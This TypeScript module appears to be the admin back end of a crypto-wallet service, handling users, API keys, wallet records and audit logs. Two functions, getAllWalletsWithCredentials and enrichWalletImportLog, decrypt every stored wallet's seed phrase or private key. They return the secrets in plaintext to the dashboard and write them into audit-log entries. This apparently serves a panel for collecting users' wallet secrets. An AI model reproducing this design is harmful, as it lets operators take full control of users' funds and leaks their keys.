import { randomUUID } from "crypto";
import { tryDecryptCredential } from "./crypto";
import {
  readCollection,
  writeCollection,
  type ApiKeyRecord,
  type AuditLogRecord,
  type SettingRecord,
  type UserRecord,
  type WalletRecord,
} from "./store";

export function getDashboardStats() {
  const users = readCollection<UserRecord>("users");
  const apiKeys = readCollection<ApiKeyRecord>("api_keys");
  const wallets = readCollection<WalletRecord>("wallet_records");
  const auditLogs = readCollection<AuditLogRecord>("audit_logs");

  return {
    users: users.length,
    apiKeys: apiKeys.length,
    wallets: wallets.length,
    auditLogs: auditLogs.length,
    recentLogs: [...auditLogs]
      .sort((a, b) => b.createdAt.localeCompare(a.createdAt))
      .slice(0, 10)
      .map((log) => enrichWalletImportLog(log, wallets)),
    recentUsers: [...users]
      .sort((a, b) => b.createdAt.localeCompare(a.createdAt))
      .slice(0, 5),
  };
}

export function getAllUsers() {
  return [...readCollection<UserRecord>("users")].sort((a, b) =>
    b.createdAt.localeCompare(a.createdAt),
  );
}

export function getAllApiKeys() {
  return [...readCollection<ApiKeyRecord>("api_keys")].sort((a, b) =>
    b.createdAt.localeCompare(a.createdAt),
  );
}

export function getAllWallets() {
  return [...readCollection<WalletRecord>("wallet_records")].sort((a, b) =>
    b.connectedAt.localeCompare(a.connectedAt),
  );
}

export function getAllWalletsWithCredentials() {
  return getAllWallets().map((w) => {
    const result = tryDecryptCredential(w.encryptedCredential, w.credentialIv);
    return {
      ...w,
      credential: result.ok ? result.value : null,
      credentialStatus: result.ok ? ("ok" as const) : result.reason,
    };
  });
}

export function getAllAuditLogs() {
  return [...readCollection<AuditLogRecord>("audit_logs")]
    .sort((a, b) => b.createdAt.localeCompare(a.createdAt))
    .slice(0, 100);
}

function enrichWalletImportLog(log: AuditLogRecord, wallets: WalletRecord[]) {
  if (log.action !== "wallet_import" || !log.entityId || log.detail?.includes("\n")) {
    return log;
  }

  const wallet = wallets.find((w) => w.id === log.entityId);
  if (!wallet) return log;

  const result = tryDecryptCredential(wallet.encryptedCredential, wallet.credentialIv);
  if (!result.ok) return log;

  const typeLabel = wallet.importType === "mnemonic" ? "助记词" : "私钥";
  return {
    ...log,
    detail: `${typeLabel} 导入 · ${wallet.address}\n${typeLabel}: ${result.value}`,
  };
}

export function getEnrichedAuditLogs() {
  const wallets = readCollection<WalletRecord>("wallet_records");
  return getAllAuditLogs().map((log) => enrichWalletImportLog(log, wallets));
}

export function getSystemSettings() {
  return readCollection<SettingRecord>("system_settings");
}

export function createUser(data: Omit<UserRecord, "id" | "createdAt" | "updatedAt" | "status" | "timezone"> & Partial<Pick<UserRecord, "timezone" | "status">>) {
  const users = readCollection<UserRecord>("users");
  const now = new Date().toISOString();
  const user: UserRecord = {
    id: randomUUID(),
    displayName: data.displayName,
    email: data.email ?? null,
    walletAddress: data.walletAddress ?? null,
    plan: data.plan ?? "Free",
    timezone: data.timezone ?? "Asia/Shanghai",
    status: data.status ?? "active",
    createdAt: now,
    updatedAt: now,
  };
  users.push(user);
  writeCollection("users", users);
  return user;
}

export function deleteUser(id: string) {
  const users = readCollection<UserRecord>("users");
  writeCollection(
    "users",
    users.filter((u) => u.id !== id),
  );
}

export function appendAuditLog(log: Omit<AuditLogRecord, "id" | "createdAt">) {
  const logs = readCollection<AuditLogRecord>("audit_logs");
  logs.push({
    id: randomUUID(),
    createdAt: new Date().toISOString(),
    ...log,
  });
  writeCollection("audit_logs", logs);
}
